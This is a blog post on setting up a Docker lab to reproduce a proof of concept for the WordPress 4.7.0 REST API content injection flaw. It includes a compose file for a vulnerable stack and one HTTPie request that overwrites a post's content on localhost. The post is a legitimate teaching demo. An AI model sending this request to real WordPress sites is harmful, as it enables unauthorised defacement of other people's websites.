---
title: Creating a Quick PoC for an Exploit with Docker
author: minn
type: post
date: 2019-02-18T11:47:24+00:00
url: /2019/02/18/creating-a-quick-poc-exploit-with-docker/
categories:
  - General
tags:
  - docker
  - httpie
  - wordpress vulnerability

---
We will create a quick PoC for an exploit for a wordpress vulnerability. This is just to demonstrate the use of docker for PoC needs. I&#8217;ll be emphasizing more on the process than the vulnerability itself. For this demo, we will be exploiting an old content injection vulnerability. You can read about its technical details here, <https://blog.sucuri.net/2017/02/content-injection-vulnerability-wordpress-rest-api.html>.

In short, the exploit only requires to send a rest API call to the wordpress application. 

To stage the demo, we will:

  * Setup a container that runs vulnerable version of WordPress-4.7. We&#8217;ll create a wordpress/mysql stack with docker compose.
  * Make an HTTP POST request with a new content that overwrites the original post. I will use HTTPie tool. You may choose any tool you&#8217;re familiar with, eg: curl, Postman, Insomnia.

Pre-requisite:

  * You must have Docker already installed. Running the command &#8220;docker version&#8221; from CLI should return server version.
  * You have an HTTP client that can make json HTTP post. I already have HTTPie on my Mac. I installed with &#8220;brew install httpie&#8221;

Create a directory.

Save the following file as &#8216;docker-compose.yml&#8217;:

```yaml
version: '2'
services:
  wordpress:
    image: wordpress:4.7.0
    ports:
      - 8080:80
    environment:
      WORDPRESS_DB_PASSWORD: example
  
  mysql:
    image: mariadb
    environment:
      MYSQL_ROOT_PASSWORD: example
```

Within the same directory run the following command:

```bash
docker-compose up --force-recreate; docker-compose down -v
```

You should see Docker downloading images and spinning up the servers. Once finished you should be able to browse to http://localhost:8080 from your browser. Follow the instructions to finish the installation (by entering site name, username, password, fake email). Then you will see the admin dashboard. Go to Settings > Permalinks and choose the second option to enable pretty links. Open another browser window or new tab and browse to http://localhost:8080 again. You should see your blog and a Hello World post.

To start exploit, run the following command from the shell/terminal to overwrite the post content.

```bash
http -f POST localhost:8080/wp-json/wp/v2/posts/1/\?id=123abc \
   content:=\"This website has been hacked\"
```

Now browse the site again and observe the &#8220;Hello World&#8221; blog post content has changed.

To end the PoC, press Ctrl+C on the docker-compose terminal.